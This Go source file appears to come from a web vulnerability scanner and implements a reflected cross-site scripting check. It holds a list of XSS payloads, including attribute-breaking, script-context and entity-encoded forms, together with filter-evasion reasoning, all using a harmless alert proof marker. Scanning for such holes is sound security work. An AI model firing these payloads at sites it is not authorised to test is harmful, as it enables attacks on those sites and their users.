package active

import (
	"context"
	"net/url"
	"strings"

	"github.com/guaidao2/crackweb/internal/checks"
	"github.com/guaidao2/crackweb/internal/finding"
	"github.com/guaidao2/crackweb/internal/httpmsg"
	"github.com/guaidao2/crackweb/internal/i18n"
	"github.com/guaidao2/crackweb/internal/payload"
)

// xssSeeds are the injection shapes worth trying, one per context a value can
// land in.
//
// Each carries the same recognisable core — `alert(document.domain)` — so a
// single judge can decide whether any of them came back executable, and so the
// evidence a reader sees is always the same obvious proof.
var xssSeeds = []string{
	// Markup contexts: the payload becomes an element.
	"<script>alert(document.domain)</script>",
	"<img src=x onerror=alert(document.domain)>",
	"<svg/onload=alert(document.domain)>",
	"<details open ontoggle=alert(document.domain)>",
	"<iframe src=javascript:alert(document.domain)>",

	// Attribute contexts. Each needs its own closing form: a value sitting in
	// double quotes is not escaped by a single one, and a value that is not
	// quoted at all is closed by whitespace. Sending only the first of these is
	// why a scanner reports the easy attributes and misses the rest.
	`" onmouseover="alert(document.domain)`,
	`" autofocus onfocus=alert(document.domain) x="`,
	`' onmouseover='alert(document.domain)`,
	`' autofocus onfocus=alert(document.domain) x='`,
	` autofocus onfocus=alert(document.domain) `,
	`javascript:alert(document.domain)`,

	// Escaping the surrounding markup first, then introducing a new element.
	`"><script>alert(document.domain)</script>`,
	`'><img src=x onerror=alert(document.domain)>`,
	`</title><script>alert(document.domain)</script>`,

	// A context that decodes twice — an `srcdoc` attribute is the common one — turns
	// an entity-encoded tag back into markup on the second pass. A page that filters
	// tags by looking for `<` sees nothing to strip, and the filter and the output
	// context disagree about what the value is. Only the literal forms would miss it.
	`&lt;img src=x onerror=alert(document.domain)&gt;`,
	`&lt;svg onload=alert(document.domain)&gt;`,

	// Inside a script block, the payload has to leave the string it was written
	// into before it can run.
	`';alert(document.domain);var x='`,
	`"-alert(document.domain)-"`,
	`</script><script>alert(document.domain)</script>`,
}

// xssReflected detects reflected cross-site scripting.
//
// The test is about *encoding*, not about a payload list: if the string that was
// sent comes back with its markup intact on a page served as HTML, a browser
// will run it. If the application escapes the value, the marker is absent and
// there is nothing to report.
//
// Mutation makes the judgement harder, and that is the point. A payload that was
// sent in an encoded form and arrives executable after the target's own decoding
// is still a finding — so the judge looks for the form the *server* would
// produce, not the form that left on the wire.
type xssReflected struct{}

func (xssReflected) ID() string                 { return "xss-reflected" }
func (xssReflected) TitleKey() i18n.Key         { return i18n.KeyCheckXSSTitle }
func (xssReflected) DescriptionKey() i18n.Key   { return i18n.KeyCheckXSSDesc }
func (xssReflected) RemediationKey() i18n.Key   { return i18n.KeyCheckXSSFix }
func (xssReflected) Severity() finding.Severity { return finding.SeverityHigh }
func (xssReflected) Tags() []string {
	return []string{"active", "injection", "xss", "owasp-top10"}
}
func (xssReflected) Passive() bool { return false }

// urlBearingAttributes are the attributes a browser follows as a URL. A `javascript:` value
// runs in these and nowhere else: the same string in `value`, `class` or `alt` is inert text
// that the browser never evaluates. Without this distinction every reflection into an
// ordinary form field reads as script execution.
var urlBearingAttributes = []string{
	"href", "src", "action", "formaction", "data", "poster", "background",
	"codebase", "cite", "longdesc", "usemap", "xlink:href", "srcdoc",
}

// inertElements are elements whose content the HTML parser treats as text, so a
// tag inside one never runs.
var inertElements = []string{"textarea", "title", "xmp", "noscript", "noframes"}

// executableContext reports whether the first occurrence of marker in body is
// somewhere a browser would parse it as markup.
//
// The test is structural, not lexical. A payload is neutralised when the parser
// is already inside something that swallows markup — a comment, a text-only
// element — or when it sits inside a tag, where "<" is just a character in an
// attribute value. Deciding this needs no rendering engine: it needs only to
// look at what the document has open at that point, which is what an HTML parser
// would be doing anyway.
func executableContext(body, marker string) bool {
	index := strings.Index(body, marker)
	if index < 0 {
		return false
	}
	before := body[:index]

	// Inside an unterminated comment, nothing that follows is parsed.
	if strings.LastIndex(before, "<!--") > strings.LastIndex(before, "-->") {
		return false
	}

	// Inside a text-only element, tags are text.
	lowerBefore := strings.ToLower(before)
	for _, name := range inertElements {
		open := strings.LastIndex(lowerBefore, "<"+name)
		if open >= 0 && strings.LastIndex(lowerBefore, "</"+name) < open {
			return false
		}
	}

	inTag := strings.LastIndex(before, "<") > strings.LastIndex(before, ">")

	// A payload carrying no markup characters cannot create an element. The
	// `javascript:` forms are like this: they do nothing in a text node and only
	// run when they land in a URL-bearing attribute, so their being present in
	// the body is not evidence of anything — and neither is their presence in an
	// ordinary attribute, which is where a search term echoed into a form field
	// ends up.
	if !strings.ContainsAny(marker, "<>") {
		return inTag && inURLBearingAttribute(before)
	}

	// Inside a tag, the parser is reading an attribute value, so the payload
	// cannot open an element — unless it is one of the seeds that closes the
	// attribute first.
	if inTag {
		switch {
		case strings.HasPrefix(marker, "\""), strings.HasPrefix(marker, "'"),
			strings.HasPrefix(marker, ">"), strings.HasPrefix(marker, "/>"):
			return true
		default:
			return false
		}
	}
	return true
}

// describeContext names where the payload landed, for the evidence.
func describeContext(body, marker string) string {
	index := strings.Index(body, marker)
	if index < 0 {
		return "unknown"
	}
	before := strings.ToLower(body[:index])
	if strings.LastIndex(before, "<script") > strings.LastIndex(before, "</script") {
		return "inside a script block"
	}
	if lastOpen, lastClose := strings.LastIndex(before, "<"), strings.LastIndex(before, ">"); lastOpen > lastClose {
		// Which of the two it is decides whether the payload can do anything, so the
		// evidence says which. A value inside an attribute is inert until something
		// closes that attribute first.
		if strings.HasPrefix(marker, "\"") || strings.HasPrefix(marker, "'") ||
			strings.HasPrefix(marker, ">") || strings.HasPrefix(marker, "/>") {
			return "in an attribute, after closing it"
		}
		if inURLBearingAttribute(before) {
			return "in a URL-bearing attribute"
		}
		return "inside an attribute value"
	}
	return "in the document body"
}

// inURLBearingAttribute reports whether the attribute whose value the payload landed in is
// one a browser follows as a URL.
func inURLBearingAttribute(before string) bool {
	open := strings.LastIndex(before, "<")
	if open < 0 {
		return false
	}
	tag := before[open+1:]
	space := strings.IndexAny(tag, " \t\n\r")
	if space < 0 {
		return false
	}
	// The attribute being read is the one whose `=` precedes the payload.
	equals := strings.LastIndex(tag, "=")
	if equals < 0 {
		return false
	}
	head := strings.TrimRight(tag[:equals], " \t\n\r")
	end := len(head)
	for end > 0 {
		if c := head[end-1]; c == ' ' || c == '\t' || c == '\n' || c == '\r' {
			break
		}
		end--
	}
	name := head[end:]
	for _, attribute := range urlBearingAttributes {
		if name == attribute {
			return true
		}
	}
	return false
}

func (xssReflected) Run(ctx context.Context, c *checks.Context, t *checks.Target) []*finding.Finding {
	if t.Param == nil || t.Response == nil {
		return nil
	}
	// Only HTML responses can carry script: a JSON endpoint echoing the value is
	// reflected input, not cross-site scripting.
	if ct := t.Response.ContentType(); ct != "text/html" && ct != "application/xhtml+xml" && ct != "" {
		return nil
	}

	baseline := string(t.Response.Body)
	c.ProbeWAF(ctx, t)

	var (
		reflected string
		context   string
	)
	attempt, err := c.SendVariants(ctx, t, payload.XSS, "xss-reflected", xssSeeds,
		func(_ *httpmsg.Request, resp *httpmsg.Response, variant payload.Variant) bool {
			candidate := wireDecoded(variant.Value)
			if candidate == "" || !strings.Contains(string(resp.Body), candidate) {
				return false
			}
			// If the marker was already in the baseline, this page is not
			// echoing our input, it simply contains that string.
			if strings.Contains(baseline, candidate) {
				return false
			}
			// Being present is not the same as being executable. A payload
			// printed inside a comment, a textarea or an attribute value has
			// been neutralised by the page's structure whatever it says, and
			// reporting it is the difference between a scanner people run and a
			// scanner people stop running.
			if !executableContext(string(resp.Body), candidate) {
				return false
			}
			reflected = candidate
			context = describeContext(string(resp.Body), candidate)
			return true
		})
	if err != nil || attempt == nil {
		return nil
	}

	f := checks.NewFinding(xssReflected{}, t,
		i18n.KeyCheckXSSTitle, i18n.KeyCheckXSSDesc, i18n.KeyCheckXSSFix)
	f.Severity = finding.SeverityHigh
	f.Confidence = finding.ConfidenceCertain
	f.Payload = attempt.Variant.Value
	f.CWE = "CWE-79"
	f.References = []string{
		"https://owasp.org/www-community/attacks/xss/",
		"https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
		"https://cwe.mitre.org/data/definitions/79.html",
	}
	f.Evidence.Request = attempt.Request.Raw()
	f.Evidence.Response = truncate(attempt.Response.Body, 8192)
	f.Evidence.Baseline = truncate(t.Response.Body, 4096)
	f.Evidence.Matches = []string{
		c.Bundle.T(i18n.KeyEvidenceReflect, reflected),
		"the payload landed outside every inert context and is parsed as markup: " + context,
		variantNote(c, attempt),
	}
	f.Evidence.Diff = extractAround(string(attempt.Response.Body), reflected, 240)
	return []*finding.Finding{f}
}

// wireDecoded returns the form a payload ends up in after the target has finished
// decoding it.
//
// It is what the judge has to look for, and it has to peel every layer the
// mutation added. A doubly-encoded variant (`%253Cscript%253E`) leaves the
// filter reading `%3Cscript%3E` and reaches the application as `<script>`, so
// looking for either the sent string or a single decode would report nothing
// exactly when the evasion worked.
//
// Stopping at the first layer that does not change is also what keeps the test
// honest: if the response only ever contains the still-encoded form, the payload
// never became markup and there is nothing to report.
func wireDecoded(value string) string {
	decoded := value
	for layer := 0; layer < 4; layer++ {
		next, err := url.QueryUnescape(decoded)
		if err != nil || next == decoded {
			break
		}
		decoded = next
	}
	if decoded == "" {
		return value
	}
	return decoded
}
